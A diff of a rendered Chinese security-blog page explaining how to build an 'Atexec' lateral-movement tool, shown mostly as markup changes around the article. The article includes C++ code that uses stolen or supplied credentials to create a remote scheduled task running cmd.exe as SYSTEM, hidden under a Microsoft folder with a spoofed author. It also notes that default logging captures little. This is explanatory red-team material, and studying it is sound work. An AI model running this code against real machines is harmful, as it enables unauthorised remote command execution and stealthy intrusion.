@@ -1,15 +1,27 @@
-<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>如何实现一个Atexec - 倾旋的博客</title><meta name=theme-color><meta name=description content='0x01 Atexec，一种横向方式
+<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><link rel=stylesheet href=/css/fancybox.css><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>如何实现一个Atexec - 倾旋的博客</title><meta name=theme-color><meta name=description content='0x01 Atexec，一种横向方式
 Atexec是一个除了Psexec以外，被高频使用的横向方式，该技术手段主要通过任务计划实现，与时间有关。
 Atexec的主要特点是通过135端口进行任务计划任务的创建，同时通过445端口进行SMB认证，取回命令执行的结果。
 0x02 执行过程
 首先，我们用成品来进行一次命令执行：
 
+  
+
+
 执行完成，能够看到whoami的结果是SYSTEM权限，通过流量上分析：
+
+  
+
 
 首先，源主机192.168.164.1向目标主机192.168.164.140的135端口建立连接，由于是RPC协议，所以会进行一次端口随机的协商，于是源主机端口变成57523，目标主机源端口变成49154，这使得流量设备在数据传输上不能轻易的监控传输内容。
 
+  
+
+
 紧接着，源主机向目标主机进行SMB认证，完成文件的读取（命令执行结果），最终断开连接。
 在操作系统的事件查看器中，**（默认情况下）**仅仅捕获了几条Windows认证的日志，关于服务、文件操作、应用程序等都没有相关日志。
+
+  
+
 
 0x03 实现过程
 要实现一个Atexec并不难，首先需要梳理一下实现思路，第一步需要根据提供的凭证创建任务计划，然后程序等待任务计划完成后，获取任务计划的执行结果。
@@ -35,17 +47,17 @@ BOOL ConnectTaskServer(LPCWSTR lpwsHost, LPCWSTR lpwDomain,LPCWSTR lpwsUserName,
 	}
 	return TRUE;
 }
-Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是涉及COM组件的操作，都变得有些复杂，但至少实现Atexec涉及到的知识点并不多。'><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.150.0"><meta itemprop=name content="如何实现一个Atexec"><meta itemprop=description content="本文主要从程序编写的角度实现atexec..."><meta itemprop=datePublished content="2020-06-28T00:00:00+00:00"><meta itemprop=dateModified content="2020-06-28T00:00:00+00:00"><meta itemprop=wordCount content="1086"><meta property="og:url" content="https://payloads.online/archivers/2020-06-28/1/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="如何实现一个Atexec"><meta property="og:description" content="本文主要从程序编写的角度实现atexec..."><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-06-28T00:00:00+00:00"><meta property="article:modified_time" content="2020-06-28T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="如何实现一个Atexec"><meta name=twitter:description content="本文主要从程序编写的角度实现atexec..."><link rel=canonical href=https://payloads.online/archivers/2020-06-28/1/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">如何实现一个Atexec</h1><div class="text-xs antialiased opacity-60"><time>Jun 28, 2020</time><span class=mx-1>&#183;</span>
-<span>倾旋</span></div></header><section><h2 id=0x01-atexec一种横向方式>0x01 Atexec，一种横向方式</h2><p>Atexec是一个除了Psexec以外，被高频使用的横向方式，该技术手段主要通过任务计划实现，与<strong>时间</strong>有关。</p><p>Atexec的主要特点是通过135端口进行任务计划任务的创建，同时通过445端口进行SMB认证，取回命令执行的结果。</p><h2 id=0x02-执行过程>0x02 执行过程</h2><p>首先，我们用成品来进行一次命令执行：</p><p><img src=https://images.payloads.online/9f549b10-4f5f-11ec-8e16-00d861bf4abb.png alt=2020-06-28-22-03-13></p><p>执行完成，能够看到whoami的结果是SYSTEM权限，通过流量上分析：</p><p><img src=https://images.payloads.online/9f9add14-4f5f-11ec-8c69-00d861bf4abb.png alt=2020-06-28-22-03-27></p><p>首先，源主机192.168.164.1向目标主机192.168.164.140的135端口建立连接，由于是RPC协议，所以会进行一次端口随机的协商，于是源主机端口变成57523，目标主机源端口变成49154，这使得流量设备在数据传输上不能轻易的监控传输内容。</p><p><img src=https://images.payloads.online/9fe50f24-4f5f-11ec-8acd-00d861bf4abb.png alt=2020-06-28-22-03-40></p><p>紧接着，源主机向目标主机进行SMB认证，完成文件的读取（命令执行结果），最终断开连接。</p><p>在操作系统的事件查看器中，**（默认情况下）**仅仅捕获了几条Windows认证的日志，关于服务、文件操作、应用程序等都没有相关日志。</p><p><img src=https://images.payloads.online/a025f520-4f5f-11ec-896d-00d861bf4abb.png alt=2020-06-28-22-03-53></p><h2 id=0x03-实现过程>0x03 实现过程</h2><p>要实现一个Atexec并不难，首先需要梳理一下实现思路，第一步需要根据提供的凭证创建任务计划，然后程序等待任务计划完成后，获取任务计划的执行结果。</p><h3 id=如何远程创建任务计划>如何远程创建任务计划？</h3><p>这里主要涉及到COM组件的操作，我用封装函数的方式来实现使得程序可读性变高。</p><p><strong>使用凭证连接远程主机的任务计划接口：</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>BOOL <span style=color:#a6e22e>ConnectTaskServer</span>(LPCWSTR lpwsHost, LPCWSTR lpwDomain,LPCWSTR lpwsUserName, LPCWSTR lpwsPassword) {
+Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是涉及COM组件的操作，都变得有些复杂，但至少实现Atexec涉及到的知识点并不多。'><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.153.5"><meta itemprop=name content="如何实现一个Atexec"><meta itemprop=description content="本文主要从程序编写的角度实现atexec..."><meta itemprop=datePublished content="2020-06-28T00:00:00+00:00"><meta itemprop=dateModified content="2020-06-28T00:00:00+00:00"><meta itemprop=wordCount content="1086"><meta property="og:url" content="https://payloads.online/archivers/2020-06-28/1/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="如何实现一个Atexec"><meta property="og:description" content="本文主要从程序编写的角度实现atexec..."><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-06-28T00:00:00+00:00"><meta property="article:modified_time" content="2020-06-28T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="如何实现一个Atexec"><meta name=twitter:description content="本文主要从程序编写的角度实现atexec..."><link rel=canonical href=https://payloads.online/archivers/2020-06-28/1/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">如何实现一个Atexec</h1><div class="text-xs antialiased opacity-60"><time>Jun 28, 2020</time><span class=mx-1>&#183;</span>
+<span>倾旋</span></div></header><section><h2 id=0x01-atexec一种横向方式>0x01 Atexec，一种横向方式</h2><p>Atexec是一个除了Psexec以外，被高频使用的横向方式，该技术手段主要通过任务计划实现，与<strong>时间</strong>有关。</p><p>Atexec的主要特点是通过135端口进行任务计划任务的创建，同时通过445端口进行SMB认证，取回命令执行的结果。</p><h2 id=0x02-执行过程>0x02 执行过程</h2><p>首先，我们用成品来进行一次命令执行：</p><p><a href=https://images.payloads.online/9f549b10-4f5f-11ec-8e16-00d861bf4abb.png data-fancybox=gallery data-caption=2020-06-28-22-03-13><img src=https://images.payloads.online/9f549b10-4f5f-11ec-8e16-00d861bf4abb.png alt=2020-06-28-22-03-13></a></p><p>执行完成，能够看到whoami的结果是SYSTEM权限，通过流量上分析：</p><p><a href=https://images.payloads.online/9f9add14-4f5f-11ec-8c69-00d861bf4abb.png data-fancybox=gallery data-caption=2020-06-28-22-03-27><img src=https://images.payloads.online/9f9add14-4f5f-11ec-8c69-00d861bf4abb.png alt=2020-06-28-22-03-27></a></p><p>首先，源主机192.168.164.1向目标主机192.168.164.140的135端口建立连接，由于是RPC协议，所以会进行一次端口随机的协商，于是源主机端口变成57523，目标主机源端口变成49154，这使得流量设备在数据传输上不能轻易的监控传输内容。</p><p><a href=https://images.payloads.online/9fe50f24-4f5f-11ec-8acd-00d861bf4abb.png data-fancybox=gallery data-caption=2020-06-28-22-03-40><img src=https://images.payloads.online/9fe50f24-4f5f-11ec-8acd-00d861bf4abb.png alt=2020-06-28-22-03-40></a></p><p>紧接着，源主机向目标主机进行SMB认证，完成文件的读取（命令执行结果），最终断开连接。</p><p>在操作系统的事件查看器中，**（默认情况下）**仅仅捕获了几条Windows认证的日志，关于服务、文件操作、应用程序等都没有相关日志。</p><p><a href=https://images.payloads.online/a025f520-4f5f-11ec-896d-00d861bf4abb.png data-fancybox=gallery data-caption=2020-06-28-22-03-53><img src=https://images.payloads.online/a025f520-4f5f-11ec-896d-00d861bf4abb.png alt=2020-06-28-22-03-53></a></p><h2 id=0x03-实现过程>0x03 实现过程</h2><p>要实现一个Atexec并不难，首先需要梳理一下实现思路，第一步需要根据提供的凭证创建任务计划，然后程序等待任务计划完成后，获取任务计划的执行结果。</p><h3 id=如何远程创建任务计划>如何远程创建任务计划？</h3><p>这里主要涉及到COM组件的操作，我用封装函数的方式来实现使得程序可读性变高。</p><p><strong>使用凭证连接远程主机的任务计划接口：</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>BOOL <span style=color:#a6e22e>ConnectTaskServer</span>(LPCWSTR lpwsHost, LPCWSTR lpwDomain,LPCWSTR lpwsUserName, LPCWSTR lpwsPassword) {
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 初始化COM组件
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	hr <span style=color:#f92672>=</span> CoInitializeEx(NULL, COINIT_MULTITHREADED);
+</span></span></span><span style=display:flex><span>	hr <span style=color:#f92672>=</span> CoInitializeEx(NULL, COINIT_MULTITHREADED);
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 设置组件安全等级
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	hr <span style=color:#f92672>=</span> CoInitializeSecurity(NULL, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, <span style=color:#ae81ff>0</span>, NULL);
+</span></span></span><span style=display:flex><span>	hr <span style=color:#f92672>=</span> CoInitializeSecurity(NULL, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, <span style=color:#ae81ff>0</span>, NULL);
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 创建任务服务容器
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	hr <span style=color:#f92672>=</span> CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (<span style=color:#66d9ef>void</span><span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>pService);
+</span></span></span><span style=display:flex><span>	hr <span style=color:#f92672>=</span> CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (<span style=color:#66d9ef>void</span><span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>pService);
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 连接目标服务器为远程连接或本地服务器
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	hr <span style=color:#f92672>=</span> pService<span style=color:#f92672>-&gt;</span>Connect(_variant_t(lpwsHost), _variant_t(lpwsUserName), _variant_t(lpwDomain), _variant_t(lpwsPassword));	<span style=color:#75715e>//默认本地
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span> (FAILED(hr))
+</span></span></span><span style=display:flex><span>	hr <span style=color:#f92672>=</span> pService<span style=color:#f92672>-&gt;</span>Connect(_variant_t(lpwsHost), _variant_t(lpwsUserName), _variant_t(lpwDomain), _variant_t(lpwsPassword));	<span style=color:#75715e>//默认本地
+</span></span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (FAILED(hr))
 </span></span><span style=display:flex><span>	{
 </span></span><span style=display:flex><span>		printf(<span style=color:#e6db74>&#34;ITaskService::Connect failed: %x </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, hr);
 </span></span><span style=display:flex><span>		
@@ -65,40 +77,40 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>	wstring wstrExePath(TEXT(<span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>System32</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>cmd.exe&#34;</span>));
 </span></span><span style=display:flex><span>	
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 获取任务文件夹并在其中创建任务
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pService<span style=color:#f92672>-&gt;</span>GetFolder(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Microsoft</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>AppID&#34;</span>), <span style=color:#f92672>&amp;</span>pRootFolder);
+</span></span></span><span style=display:flex><span>	pService<span style=color:#f92672>-&gt;</span>GetFolder(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Microsoft</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>AppID&#34;</span>), <span style=color:#f92672>&amp;</span>pRootFolder);
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 如果存在同名任务，删除它
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pRootFolder<span style=color:#f92672>-&gt;</span>DeleteTask(_bstr_t(wTaskName), <span style=color:#ae81ff>0</span>);
+</span></span></span><span style=display:flex><span>	pRootFolder<span style=color:#f92672>-&gt;</span>DeleteTask(_bstr_t(wTaskName), <span style=color:#ae81ff>0</span>);
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 使用ITaskDefinition对象定义任务相关信息
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	ITaskDefinition<span style=color:#f92672>*</span> pTask <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	ITaskDefinition<span style=color:#f92672>*</span> pTask <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pService<span style=color:#f92672>-&gt;</span>NewTask(<span style=color:#ae81ff>0</span>, <span style=color:#f92672>&amp;</span>pTask);
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 使用IRegistrationInfo对象对任务的基础信息填充
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	IRegistrationInfo<span style=color:#f92672>*</span> pRegInfo <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	IRegistrationInfo<span style=color:#f92672>*</span> pRegInfo <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pTask<span style=color:#f92672>-&gt;</span>get_RegistrationInfo(<span style=color:#f92672>&amp;</span>pRegInfo);
 </span></span><span style=display:flex><span>	pRegInfo<span style=color:#f92672>-&gt;</span>put_Author(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;Microsoft Corporation&#34;</span>));
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 创建任务的安全凭证
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	IPrincipal<span style=color:#f92672>*</span> pPrincipal <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	IPrincipal<span style=color:#f92672>*</span> pPrincipal <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pTask<span style=color:#f92672>-&gt;</span>get_Principal(<span style=color:#f92672>&amp;</span>pPrincipal);
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 设置规则为交互式登录
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pPrincipal<span style=color:#f92672>-&gt;</span>put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
+</span></span></span><span style=display:flex><span>	pPrincipal<span style=color:#f92672>-&gt;</span>put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
 </span></span><span style=display:flex><span>  <span style=color:#75715e>// 指定执行用户
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pPrincipal<span style=color:#f92672>-&gt;</span>put_UserId(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;NT AUTHORITY</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>SYSTEM&#34;</span>));
+</span></span></span><span style=display:flex><span>	pPrincipal<span style=color:#f92672>-&gt;</span>put_UserId(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;NT AUTHORITY</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>SYSTEM&#34;</span>));
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 创建任务的设置信息
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	ITaskSettings<span style=color:#f92672>*</span> pTaskSettings <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	ITaskSettings<span style=color:#f92672>*</span> pTaskSettings <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pTask<span style=color:#f92672>-&gt;</span>get_Settings(<span style=color:#f92672>&amp;</span>pTaskSettings);
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 为设置信息赋值
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pTaskSettings<span style=color:#f92672>-&gt;</span>put_StartWhenAvailable(VARIANT_TRUE);
+</span></span></span><span style=display:flex><span>	pTaskSettings<span style=color:#f92672>-&gt;</span>put_StartWhenAvailable(VARIANT_TRUE);
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 设置任务的idle设置
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	IIdleSettings<span style=color:#f92672>*</span> pIdleSettings <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	IIdleSettings<span style=color:#f92672>*</span> pIdleSettings <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pTaskSettings<span style=color:#f92672>-&gt;</span>get_IdleSettings(<span style=color:#f92672>&amp;</span>pIdleSettings);
 </span></span><span style=display:flex><span>	pIdleSettings<span style=color:#f92672>-&gt;</span>put_WaitTimeout(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;PT1M&#34;</span>));
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#75715e>//创建触发器
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	ITriggerCollection<span style=color:#f92672>*</span> pTriggerCollection <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	ITriggerCollection<span style=color:#f92672>*</span> pTriggerCollection <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pTask<span style=color:#f92672>-&gt;</span>get_Triggers(<span style=color:#f92672>&amp;</span>pTriggerCollection);
 </span></span><span style=display:flex><span>	ITrigger<span style=color:#f92672>*</span> pTrigger <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>
@@ -112,21 +124,21 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> FALSE;
 </span></span><span style=display:flex><span>	}
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 设置时间触发器
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	ITimeTrigger<span style=color:#f92672>*</span> pTimeTrigger <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	ITimeTrigger<span style=color:#f92672>*</span> pTimeTrigger <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pTrigger<span style=color:#f92672>-&gt;</span>QueryInterface(IID_ITimeTrigger, (<span style=color:#66d9ef>void</span><span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>pTimeTrigger);
 </span></span><span style=display:flex><span>	pTimeTrigger<span style=color:#f92672>-&gt;</span>put_Id(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;Trigger2&#34;</span>));
 </span></span><span style=display:flex><span>	CurrentTime <span style=color:#f92672>=</span> GetTime();
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 在10秒后执行
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pTimeTrigger<span style=color:#f92672>-&gt;</span>put_StartBoundary(_bstr_t(CurrentTime.data()));
+</span></span></span><span style=display:flex><span>	pTimeTrigger<span style=color:#f92672>-&gt;</span>put_StartBoundary(_bstr_t(CurrentTime.data()));
 </span></span><span style=display:flex><span>	pTimeTrigger<span style=color:#f92672>-&gt;</span>put_EndBoundary(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;2089-03-26T13:00:00&#34;</span>));
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 创建任务动作
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	IActionCollection<span style=color:#f92672>*</span> pActionCollection <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	IActionCollection<span style=color:#f92672>*</span> pActionCollection <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pTask<span style=color:#f92672>-&gt;</span>get_Actions(<span style=color:#f92672>&amp;</span>pActionCollection);
 </span></span><span style=display:flex><span>	IAction<span style=color:#f92672>*</span> pAction <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pActionCollection<span style=color:#f92672>-&gt;</span>Create(TASK_ACTION_EXEC, <span style=color:#f92672>&amp;</span>pAction);
 </span></span><span style=display:flex><span>	IExecAction<span style=color:#f92672>*</span> pExecAction <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 出入执行命令及参数
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pAction<span style=color:#f92672>-&gt;</span>QueryInterface(IID_IExecAction, (<span style=color:#66d9ef>void</span><span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>pExecAction);
+</span></span></span><span style=display:flex><span>	pAction<span style=color:#f92672>-&gt;</span>QueryInterface(IID_IExecAction, (<span style=color:#66d9ef>void</span><span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>pExecAction);
 </span></span><span style=display:flex><span>	pExecAction<span style=color:#f92672>-&gt;</span>put_Path(_bstr_t(wstrExePath.c_str()));
 </span></span><span style=display:flex><span>	pExecAction<span style=color:#f92672>-&gt;</span>put_Arguments(_bstr_t(CommandArgs.data()));
 </span></span><span style=display:flex><span>
@@ -135,7 +147,7 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
